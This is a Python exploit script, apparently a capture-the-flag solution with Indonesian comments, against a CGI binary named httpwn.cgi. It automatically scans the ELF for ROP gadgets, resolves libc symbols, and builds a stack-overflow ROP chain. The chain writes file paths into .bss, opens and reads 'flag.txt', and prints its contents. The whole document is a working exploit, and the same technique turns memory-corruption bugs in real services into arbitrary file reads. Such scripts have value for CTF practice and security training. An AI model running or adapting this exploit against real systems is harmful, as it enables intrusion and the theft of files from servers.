#!/usr/bin/env python3
import os, re, struct, subprocess, sys

BIN = sys.argv[1] if len(sys.argv) > 1 else "./httpwn.cgi"

def p64(x): return struct.pack("<Q", x & 0xffffffffffffffff)

# ---------- ELF PT_LOAD mapping + gadget scan ----------
PT_LOAD = 1
PF_X = 1

def parse_elf_loads(path):
    data = open(path, "rb").read()
    if data[:4] != b"\x7fELF" or data[4] != 2:
        raise SystemExit("Not ELF64")
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsz = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]

    loads = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsz
        p_type, p_flags = struct.unpack_from("<II", data, off)
        if p_type != PT_LOAD:
            continue
        p_offset, p_vaddr, p_filesz = struct.unpack_from("<QQQ", data, off + 0x08)
        loads.append((p_offset, p_filesz, p_vaddr, p_flags))
    return data, loads

def off_to_va(loads, file_off):
    for p_offset, p_filesz, p_vaddr, p_flags in loads:
        if p_offset <= file_off < p_offset + p_filesz:
            return p_vaddr + (file_off - p_offset), p_flags
    return None, None

def find_gadget(data, loads, needle: bytes, want_exec=True):
    start = 0
    while True:
        idx = data.find(needle, start)
        if idx == -1:
            return None
        va, flags = off_to_va(loads, idx)
        if va is not None:
            if (not want_exec) or (flags & PF_X):
                return va
        start = idx + 1

def nm_sym(path, name):
    out = subprocess.check_output(["nm", "-n", path], text=True, errors="ignore")
    for line in out.splitlines():
        parts = line.strip().split()
        if len(parts) == 3 and parts[2] == name:
            return int(parts[0], 16)
    raise KeyError(f"symbol {name} not found")

data, loads = parse_elf_loads(BIN)

POP_RDI = find_gadget(data, loads, b"\x5f\xc3")            # pop rdi ; ret
POP_RSI = find_gadget(data, loads, b"\x5e\xc3")            # pop rsi ; ret
POP_RDX_RBX = find_gadget(data, loads, b"\x5a\x5b\xc3")     # pop rdx ; pop rbx ; ret
POP_RAX_RDX_RBX = find_gadget(data, loads, b"\x58\x5a\x5b\xc3")  # pop rax ; pop rdx ; pop rbx ; ret
SYSCALL_RET = find_gadget(data, loads, b"\x0f\x05\xc3")     # syscall ; ret
MOV_QWORD_PTR_RDI_RDX = find_gadget(data, loads, b"\x48\x89\x17\xc3")  # mov [rdi], rdx ; ret
RET = find_gadget(data, loads, b"\xc3")                     # ret (any)

if None in (POP_RDI, POP_RSI, POP_RDX_RBX, POP_RAX_RDX_RBX, SYSCALL_RET, MOV_QWORD_PTR_RDI_RDX, RET):
    raise SystemExit("Gadget tidak lengkap, binary beda/aneh.")

OPEN  = nm_sym(BIN, "open")
READ  = nm_sym(BIN, "read")
WRITE = nm_sym(BIN, "write")
EXIT  = nm_sym(BIN, "_exit")

# .bss: cari dari nm symbol __bss_start kalau ada; fallback ke hard guess via nm.
try:
    BSS = nm_sym(BIN, "__bss_start")
except Exception:
    # fallback: banyak build static punya .bss di sekitar 0x4a0000
    BSS = 0x4a0000

PATH1 = BSS + 0x300
PATH2 = BSS + 0x340
BUF   = BSS + 0x400

def write_qword(addr, qword):
    return b"".join([
        p64(POP_RDI), p64(addr),
        p64(POP_RDX_RBX), p64(qword), p64(0),
        p64(MOV_QWORD_PTR_RDI_RDX),
    ])

def write_bytes(addr, bs: bytes):
    out = b""
    for i in range(0, len(bs), 8):
        chunk = bs[i:i+8].ljust(8, b"\x00")
        out += write_qword(addr + i, struct.unpack("<Q", chunk)[0])
    return out

rop = b""

# close(3..20) via syscall: rax=3, rdi=fd
SYS_CLOSE = 3
for fd in range(3, 21):
    rop += b"".join([
        p64(POP_RDI), p64(fd),
        p64(POP_RAX_RDX_RBX), p64(SYS_CLOSE), p64(0), p64(0),
        p64(SYSCALL_RET),
    ])

# write "./flag.txt" and "/flag.txt"
rop += write_bytes(PATH1, b"./flag.txt\x00")
rop += write_bytes(PATH2, b"/flag.txt\x00")

# open("./flag.txt", O_RDONLY, 0)  -> should become fd=3
rop += b"".join([
    p64(POP_RDI), p64(PATH1),
    p64(POP_RSI), p64(0),
    p64(POP_RDX_RBX), p64(0), p64(0),
    p64(RET),
    p64(OPEN),
])

# open("/flag.txt", O_RDONLY, 0)   -> if first failed, this becomes fd=3
rop += b"".join([
    p64(POP_RDI), p64(PATH2),
    p64(POP_RSI), p64(0),
    p64(POP_RDX_RBX), p64(0), p64(0),
    p64(RET),
    p64(OPEN),
])

# read(3, BUF, 0x100)
rop += b"".join([
    p64(POP_RDI), p64(3),
    p64(POP_RSI), p64(BUF),
    p64(POP_RDX_RBX), p64(0x100), p64(0),
    p64(RET),
    p64(READ),
])

# write(1, BUF, 0x100)
rop += b"".join([
    p64(POP_RDI), p64(1),
    p64(POP_RSI), p64(BUF),
    p64(POP_RDX_RBX), p64(0x100), p64(0),
    p64(RET),
    p64(WRITE),
])

# _exit(0) (biar gak balik ke libc dan bikin chaos)
rop += b"".join([
    p64(POP_RDI), p64(0),
    p64(RET),
    p64(EXIT),
])

# offset RIP = 0x68 (data at rbp-0x60, RIP at rbp+8)
payload = b"A"*0x68 + rop

env = os.environ.copy()
env["CONTENT_LENGTH"] = str(len(payload))

cwd = os.path.dirname(os.path.abspath(BIN)) or "."
p = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, cwd=cwd)
out, err = p.communicate(payload)

blob = out + b"\n" + err
print(blob.decode("latin-1", errors="replace"))

m = re.search(r"[A-Za-z0-9_]+\{[^}]{1,200}\}", blob.decode("latin-1", errors="ignore"))
if m:
    print("\n[+] FLAG:", m.group(0))
else:
    print("\n[-] Flag belum kebaca. Biasanya path salah atau read fd bukan 3 (tapi kita sudah close 3..20).")
